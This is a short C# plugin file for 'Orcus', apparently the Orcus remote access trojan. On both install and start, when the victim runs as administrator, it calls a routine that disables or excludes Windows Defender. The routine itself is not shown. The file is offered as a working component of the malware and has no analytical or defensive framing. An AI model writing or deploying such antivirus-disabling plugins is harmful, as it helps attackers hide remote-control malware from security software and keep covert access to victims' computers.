using Orcus.Plugins;

namespace DefenderExclusion
{
	public class Plugin : ClientController
	{
		private bool _DefenderExcluder;

		public override void Start()
		{
			if (!_DefenderExcluder && User.IsAdministrator)
			{
				_DefenderExcluder = true;
				DefenderExcluder.Disable();
			}
		}

		public override void Install(string executablePath)
		{
			if (!_DefenderExcluder && User.IsAdministrator)
			{
				_DefenderExcluder = true;
				DefenderExcluder.Disable();
			}
		}
	}
}
